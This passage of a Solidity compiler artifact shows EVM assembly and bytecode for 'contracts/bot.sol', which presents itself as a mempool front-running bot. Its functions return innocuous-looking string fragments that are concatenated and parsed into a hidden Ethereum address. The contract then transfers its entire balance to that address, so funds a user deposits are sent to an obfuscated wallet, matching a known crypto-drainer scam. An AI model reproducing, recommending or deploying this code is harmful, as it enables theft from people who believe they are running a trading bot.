\"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":14473:14632  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, ... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup4\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_57:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_59\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_57)\n    tag_59:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":14473:14632  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, ... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_60:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_62\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_60)\n    tag_62:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":14473:14632  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, ... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap9\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"contracts/bot.sol\":14473:14632  abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, ... */\n      swap1\n      0x40\n      mstore\n        /* \"contracts/bot.sol\":14459:14633  return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, ... */\n      swap9\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":13305:14640  function fetchMempoolData() internal pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":5381:6303  function startExploration(string memory _a) internal pure returns (address _parsedAddress) {... */\n    tag_17:\n        /* \"contracts/bot.sol\":5448:5470  address _parsedAddress */\n      0x00\n        /* \"contracts/bot.sol\":5482:5498  bytes memory tmp */\n      0x60\n        /* \"contracts/bot.sol\":5507:5509  _a */\n      dup3\n        /* \"contracts/bot.sol\":5482:5510  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":5520:5533  uint160 iaddr */\n      0x00\n        /* \"contracts/bot.sol\":5536:5537  0 */\n      dup1\n        /* \"contracts/bot.sol\":5520:5537  uint160 iaddr = 0 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":5547:5557  uint160 b1 */\n      0x00\n        /* \"contracts/bot.sol\":5567:5577  uint160 b2 */\n      dup1\n        /* \"contracts/bot.sol\":5592:5598  uint i */\n      0x00\n        /* \"contracts/bot.sol\":5601:5602  2 */\n      0x02\n        /* \"contracts/bot.sol\":5592:5602  uint i = 2 */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":5587:6266  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n    tag_64:\n        /* \"contracts/bot.sol\":5608:5618  2 + 2 * 20 */\n      0x2a\n        /* \"contracts/bot.sol\":5604:5605  i */\n      dup2\n        /* \"contracts/bot.sol\":5604:5618  i < 2 + 2 * 20 */\n      lt\n        /* \"contracts/bot.sol\":5587:6266  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n      iszero\n      tag_65\n      jumpi\n        /* \"contracts/bot.sol\":5651:5654  256 */\n      0x0100\n        /* \"contracts/bot.sol\":5642:5654  iaddr *= 256 */\n      dup5\n      mul\n      swap4\n      pop\n        /* \"contracts/bot.sol\":5687:5690  tmp */\n      dup5\n        /* \"contracts/bot.sol\":5691:5692  i */\n      dup2\n        /* \"contracts/bot.sol\":5687:5693  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_67\n      jumpi\n      invalid\n    tag_67:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":5681:5694  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":5673:5695  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":5668:5695  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"contracts/bot.sol\":5728:5731  tmp */\n      dup5\n        /* \"contracts/bot.sol\":5736:5737  1 */\n      0x01\n        /* \"contracts/bot.sol\":5732:5733  i */\n      dup3\n        /* \"contracts/bot.sol\":5732:5737  i + 1 */\n      add\n        /* \"contracts/bot.sol\":5728:5738  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_68\n      jumpi\n      invalid\n    tag_68:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"contracts/bot.sol\":5722:5739  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"contracts/bot.sol\":5714:5740  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"contracts/bot.sol\":5709:5740  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"contracts/bot.sol\":5765:5767  97 */\n      0x61\n        /* \"contracts/bot.sol\":5759:5761  b1 */\n      dup4\n        /* \"contracts/bot.sol\":5759:5767  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":5758:5783  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_69\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":5779:5782  102 */\n      0x66\n        /* \"contracts/bot.sol\":5773:5775  b1 */\n      dup4\n        /* \"contracts/bot.sol\":5773:5782  b1 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":5758:5783  (b1 >= 97) && (b1 <= 102) */\n    tag_69:\n        /* \"contracts/bot.sol\":5754:5980  if ((b1 >= 97) && (b1 <= 102)) {... */\n      iszero\n      tag_70\n      jumpi\n        /* \"contracts/bot.sol\":5809:5811  87 */\n      0x57\n        /* \"contracts/bot.sol\":5803:5811  b1 -= 87 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":5754:5980  if ((b1 >= 97) && (b1 <= 102)) {... */\n      jump(tag_71)\n    tag_70:\n        /* \"contracts/bot.sol\":5843:5845  65 */\n      0x41\n        /* \"contracts/bot.sol\":5837:5839  b1 */\n      dup4\n        /* \"contracts/bot.sol\":5837:5845  b1 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":5836:5860  (b1 >= 65) && (b1 <= 70) */\n      dup1\n      iszero\n      tag_72\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":5857:5859  70 */\n      0x46\n        /* \"contracts/bot.sol\":5851:5853  b1 */\n      dup4\n        /* \"contracts/bot.sol\":5851:5859  b1 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":5836:5860  (b1 >= 65) && (b1 <= 70) */\n    tag_72:\n        /* \"contracts/bot.sol\":5832:5980  if ((b1 >= 65) && (b1 <= 70)) {... */\n      iszero\n      tag_73\n      jumpi\n        /* \"contracts/bot.sol\":5886:5888  55 */\n      0x37\n        /* \"contracts/bot.sol\":5880:5888  b1 -= 55 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":5832:5980  if ((b1 >= 65) && (b1 <= 70)) {... */\n      jump(tag_74)\n    tag_73:\n        /* \"contracts/bot.sol\":5920:5922  48 */\n      0x30\n        /* \"contracts/bot.sol\":5914:5916  b1 */\n      dup4\n        /* \"contracts/bot.sol\":5914:5922  b1 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":5913:5937  (b1 >= 48) && (b1 <= 57) */\n      dup1\n      iszero\n      tag_75\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":5934:5936  57 */\n      0x39\n        /* \"contracts/bot.sol\":5928:5930  b1 */\n      dup4\n        /* \"contracts/bot.sol\":5928:5936  b1 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":5913:5937  (b1 >= 48) && (b1 <= 57) */\n    tag_75:\n        /* \"contracts/bot.sol\":5909:5980  if ((b1 >= 48) && (b1 <= 57)) {... */\n      iszero\n      tag_76\n      jumpi\n        /* \"contracts/bot.sol\":5963:5965  48 */\n      0x30\n        /* \"contracts/bot.sol\":5957:5965  b1 -= 48 */\n      dup4\n      sub\n      swap3\n      pop\n        /* \"contracts/bot.sol\":5909:5980  if ((b1 >= 48) && (b1 <= 57)) {... */\n    tag_76:\n        /* \"contracts/bot.sol\":5832:5980  if ((b1 >= 65) && (b1 <= 70)) {... */\n    tag_74:\n        /* \"contracts/bot.sol\":5754:5980  if ((b1 >= 97) && (b1 <= 102)) {... */\n    tag_71:\n        /* \"contracts/bot.sol\":6004:6006  97 */\n      0x61\n        /* \"contracts/bot.sol\":5998:6000  b2 */\n      dup3\n        /* \"contracts/bot.sol\":5998:6006  b2 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":5997:6022  (b2 >= 97) && (b2 <= 102) */\n      dup1\n      iszero\n      tag_77\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":6018:6021  102 */\n      0x66\n        /* \"contracts/bot.sol\":6012:6014  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6012:6021  b2 <= 102 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":5997:6022  (b2 >= 97) && (b2 <= 102) */\n    tag_77:\n        /* \"contracts/bot.sol\":5993:6219  if ((b2 >= 97) && (b2 <= 102)) {... */\n      iszero\n      tag_78\n      jumpi\n        /* \"contracts/bot.sol\":6048:6050  87 */\n      0x57\n        /* \"contracts/bot.sol\":6042:6050  b2 -= 87 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":5993:6219  if ((b2 >= 97) && (b2 <= 102)) {... */\n      jump(tag_79)\n    tag_78:\n        /* \"contracts/bot.sol\":6082:6084  65 */\n      0x41\n        /* \"contracts/bot.sol\":6076:6078  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6076:6084  b2 >= 65 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":6075:6099  (b2 >= 65) && (b2 <= 70) */\n      dup1\n      iszero\n      tag_80\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":6096:6098  70 */\n      0x46\n        /* \"contracts/bot.sol\":6090:6092  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6090:6098  b2 <= 70 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":6075:6099  (b2 >= 65) && (b2 <= 70) */\n    tag_80:\n        /* \"contracts/bot.sol\":6071:6219  if ((b2 >= 65) && (b2 <= 70)) {... */\n      iszero\n      tag_81\n      jumpi\n        /* \"contracts/bot.sol\":6125:6127  55 */\n      0x37\n        /* \"contracts/bot.sol\":6119:6127  b2 -= 55 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":6071:6219  if ((b2 >= 65) && (b2 <= 70)) {... */\n      jump(tag_82)\n    tag_81:\n        /* \"contracts/bot.sol\":6159:6161  48 */\n      0x30\n        /* \"contracts/bot.sol\":6153:6155  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6153:6161  b2 >= 48 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"contracts/bot.sol\":6152:6176  (b2 >= 48) && (b2 <= 57) */\n      dup1\n      iszero\n      tag_83\n      jumpi\n      pop\n        /* \"contracts/bot.sol\":6173:6175  57 */\n      0x39\n        /* \"contracts/bot.sol\":6167:6169  b2 */\n      dup3\n        /* \"contracts/bot.sol\":6167:6175  b2 <= 57 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      gt\n      iszero\n        /* \"contracts/bot.sol\":6152:6176  (b2 >= 48) && (b2 <= 57) */\n    tag_83:\n        /* \"contracts/bot.sol\":6148:6219  if ((b2 >= 48) && (b2 <= 57)) {... */\n      iszero\n      tag_84\n      jumpi\n        /* \"contracts/bot.sol\":6202:6204  48 */\n      0x30\n        /* \"contracts/bot.sol\":6196:6204  b2 -= 48 */\n      dup3\n      sub\n      swap2\n      pop\n        /* \"contracts/bot.sol\":6148:6219  if ((b2 >= 48) && (b2 <= 57)) {... */\n    tag_84:\n        /* \"contracts/bot.sol\":6071:6219  if ((b2 >= 65) && (b2 <= 70)) {... */\n    tag_82:\n        /* \"contracts/bot.sol\":5993:6219  if ((b2 >= 97) && (b2 <= 102)) {... */\n    tag_79:\n        /* \"contracts/bot.sol\":6252:6254  b2 */\n      dup2\n        /* \"contracts/bot.sol\":6247:6249  16 */\n      0x10\n        /* \"contracts/bot.sol\":6242:6244  b1 */\n      dup5\n        /* \"contracts/bot.sol\":6242:6249  b1 * 16 */\n      mul\n        /* \"contracts/bot.sol\":6242:6254  b1 * 16 + b2 */\n      add\n        /* \"contracts/bot.sol\":6232:6255  iaddr += (b1 * 16 + b2) */\n      dup5\n      add\n      swap4\n      pop\n        /* \"contracts/bot.sol\":5625:5626  2 */\n      0x02\n        /* \"contracts/bot.sol\":5620:5626  i += 2 */\n      dup2\n      add\n      swap1\n      pop\n        /* \"contracts/bot.sol\":5587:6266  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n      jump(tag_64)\n    tag_65:\n      pop\n        /* \"contracts/bot.sol\":6290:6295  iaddr */\n      dup3\n        /* \"contracts/bot.sol\":6275:6296  return address(iaddr) */\n      swap5\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/bot.sol\":5381:6303  function startExploration(string memory _a) internal pure returns (address _parsedAddress) {... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/bot.sol\":11697:11786  function getBa() private view returns(uint) {... */\n    tag_19:\n        /* \"contracts/bot.sol\":11735:11739  uint */\n      0x00\n        /* \"contracts/bot.sol\":11758:11779  address(this).balance */\n      selfbalance\n        /* \"contracts/bot.sol\":11751:11779  return address(this).balance */\n      swap1\n      pop\n        /* \"contracts/bot.sol\":11697:11786  function getBa() private view returns(uint) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":9668:9763  function getMempoolShort() private pure returns (string memory) {... */\n    tag_24:\n        /* \"contracts/bot.sol\":9717:9730  string memory */\n      0x60\n        /* \"contracts/bot.sol\":9742:9756  return \"0x206\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x05\n      dup2\n      mstore\n      0x20\n      add\n      0x3078323036000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9668:9763  function getMempoolShort() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":9068:9166  function fetchMempoolEdition() private pure returns (string memory) {... */\n    tag_26:\n        /* \"contracts/bot.sol\":9121:9134  string memory */\n      0x60\n        /* \"contracts/bot.sol\":9146:9159  return \"0358\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x04\n      dup2\n      mstore\n      0x20\n      add\n      0x3033353800000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":9068:9166  function fetchMempoolEdition() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":16637:16740  function fetchMempoolVersion() private pure returns (string memory) {... */\n    tag_28:\n        /* \"contracts/bot.sol\":16690:16703  string memory */\n      0x60\n        /* \"contracts/bot.sol\":16715:16730  return \"b53bAb\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      0x6235336241620000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16637:16740  function fetchMempoolVersion() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":15008:15102  function getMempoolLong() private pure returns (string memory) {... */\n    tag_30:\n        /* \"contracts/bot.sol\":15056:15069  string memory */\n      0x60\n        /* \"contracts/bot.sol\":15081:15095  return \"8fB41\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x05\n      dup2\n      mstore\n      0x20\n      add\n      0x3866423431000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":15008:15102  function getMempoolLong() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":10406:10502  function getMempoolHeight() private pure returns (string memory) {... */\n    tag_32:\n        /* \"contracts/bot.sol\":10456:10469  string memory */\n      0x60\n        /* \"contracts/bot.sol\":10481:10495  return \"08C5f\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x05\n      dup2\n      mstore\n      0x20\n      add\n      0x3038433566000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":10406:10502  function getMempoolHeight() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":16062:16156  function getMempoolCode() private pure returns (string memory) {... */\n    tag_34:\n        /* \"contracts/bot.sol\":16110:16123  string memory */\n      0x60\n        /* \"contracts/bot.sol\":16135:16149  return \"8C4A5\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x05\n      dup2\n      mstore\n      0x20\n      add\n      0x3843344135000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":16062:16156  function getMempoolCode() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":8137:8232  function getMempoolStart() private pure returns (string memory) {... */\n    tag_36:\n        /* \"contracts/bot.sol\":8186:8199  string memory */\n      0x60\n        /* \"contracts/bot.sol\":8211:8224  return \"885b\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x04\n      dup2\n      mstore\n      0x20\n      add\n      0x3838356200000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":8137:8232  function getMempoolStart() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/bot.sol\":11444:11540  function getMempoolLog() private pure returns (string memory) {... */\n    tag_38:\n        /* \"contracts/bot.sol\":11491:11504  string memory */\n      0x60\n        /* \"contracts/bot.sol\":11516:11533  return \"8d7a8D29\" */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x08\n      dup2\n      mstore\n      0x20\n      add\n      0x3864376138443239000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      swap1\n      pop\n        /* \"contracts/bot.sol\":11444:11540  function getMempoolLog() private pure returns (string memory) {... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa26469706673582212205d1e7629bcda5b3b7286f46453c693e11b8ad7f385275ee6e99827822373facf64736f6c63430006060033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040526040518060600160405280602a8152602001610a26602a913960019080519060200190610032929190610074565b506040518060600160405280602a81526020016109fc602a913960029080519060200190610061929190610074565b5034801561006e57600080fd5b50610119565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106100b557805160ff19168380011785556100e3565b828001600101855582156100e3579182015b828111156100e25782518255916020019190600101906100c7565b5b5090506100f091906100f4565b5090565b61011691905b808211156101125760008160009055506001016100fa565b5090565b90565b6108d4806101286000396000f3fe60806040526004361061002d5760003560e01c8063be9a655514610039578063d4e932921461004357610034565b3661003457005b600080fd5b61004161004d565b005b61004b6100cc565b005b662386f26fc100004710156100ca576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601d8152602001807f496e73756666696369656e7420636f6e74726163742062616c616e636500000081525060200191505060405180910390fd5b565b60006100de6100d9610137565b610455565b905060008190508073ffffffffffffffffffffffffffffffffffffffff166108fc6101076106ae565b9081150290604051600060405180830381858888f19350505050158015610132573d6000803e3d6000fd5b505050565b6060806101426106b6565b9050606061014e6106f3565b9050606061015a610730565b9050606061016661076d565b905060606101726107aa565b9050606061017e6107e7565b9050606061018a610824565b90506060610196610861565b905087878787878787876040516020018089805190602001908083835b602083106101d657805182526020820191506020810190506020830392506101b3565b6001836020036101000a03801982511681845116808217855250505050505090500188805190602001908083835b602083106102275780518252602082019150602081019050602083039250610204565b6001836020036101000a03801982511681845116808217855250505050505090500187805190602001908083835b602083106102785780518252602082019150602081019050602083039250610255565b6001836020036101000a03801982511681845116808217855250505050505090500186805190602001908083835b602083106102c957805182526020820191506020810190506020830392506102a6565b6001836020036101000a03801982511681845116808217855250505050505090500185805190602001908083835b6020831061031a57805182526020820191506020810190506020830392506102f7565b6001836020036101000a03801982511681845116808217855250505050505090500184805190602001908083835b6020831061036b5780518252602082019150602081019050602083039250610348565b6001836020036101000a03801982511681845116808217855250505050505090500183805190602001908083835b602083106103bc5780518252602082019150602081019050602083039250610399565b6001836020036101000a03801982511681845116808217855250505050505090500182805190602001908083835b6020831061040d57805182526020820191506020810190506020830392506103ea565b6001836020036101000a038019825116818451168082178552505050505050905001985050505050505050506040516020818303038152906040529850505050505050505090565b6000606082905060008090506000806000600290505b602a8110156106a1576101008402935084818151811061048757fe5b602001015160f81c60f81b60f81c60ff1692508460018201815181106104a957fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff16101580156104fa575060668373ffffffffffffffffffffffffffffffffffffffff1611155b1561050a576057830392506105a4565b60418373ffffffffffffffffffffffffffffffffffffffff1610158015610548575060468373ffffffffffffffffffffffffffffffffffffffff1611155b15610558576037830392506105a3565b60308373ffffffffffffffffffffffffffffffffffffffff1610158015610596575060398373ffffffffffffffffffffffffffffffffffffffff1611155b156105a2576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff16101580156105e2575060668273ffffffffffffffffffffffffffffffffffffffff1611155b156105f25760578203915061068c565b60418273ffffffffffffffffffffffffffffffffffffffff1610158015610630575060468273ffffffffffffffffffffffffffffffffffffffff1611155b156106405760378203915061068b565b60308273ffffffffffffffffffffffffffffffffffffffff161015801561067e575060398273ffffffffffffffffffffffffffffffffffffffff1611155b1561068a576030820391505b5b5b8160108402018401935060028101905061046b565b5082945050505050919050565b600047905090565b60606040518060400160405280600581526020017f3078323036000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600481526020017f3033353800000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600681526020017f6235336241620000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600581526020017f3866423431000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600581526020017f3038433566000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600581526020017f3843344135000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600481526020017f3838356200000000000000000000000000000000000000000000000000000000815250905090565b60606040518060400160405280600881526020017f386437613844323900000000000000000000000000000000000000000000000081525090509056fea26469706673582212205d1e7629bcda5b3b7286f46453c693e11b8ad7f385275ee6e99827822373facf64736f6c63430006060033307837613235306435363330423463463533393733396446324335644163623463363539463234383844307843303261614133396232323346453844304130653543344632376541443930383343373536436332",
